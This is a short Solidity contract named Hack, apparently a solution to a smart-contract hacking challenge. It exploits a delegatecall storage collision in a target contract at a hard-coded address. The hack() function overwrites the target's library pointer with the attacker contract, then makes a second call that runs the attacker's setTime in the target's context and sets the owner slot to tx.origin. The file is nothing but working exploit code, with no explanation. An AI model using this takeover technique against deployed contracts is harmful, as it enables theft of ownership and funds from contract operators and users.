// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ITarget {
    function setFirstTime(uint256 _timeStamp) external;
    function setSecondTime(uint256 _timeStamp) external;
}

contract Hack {
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;
    uint256 storedTime;

    ITarget public target = ITarget(0xB97Ddb158DF3d0EDCa3ffd2b20F3b24b151F1ea7);
     
    constructor() {

    }

    function setTime(uint256 _time) public {
        owner = address(uint160(_time));
    }

    function hack() public {
        target.setSecondTime(uint256(uint160(address(this))));
        target.setFirstTime(uint256(uint160(address(tx.origin))));
    }

}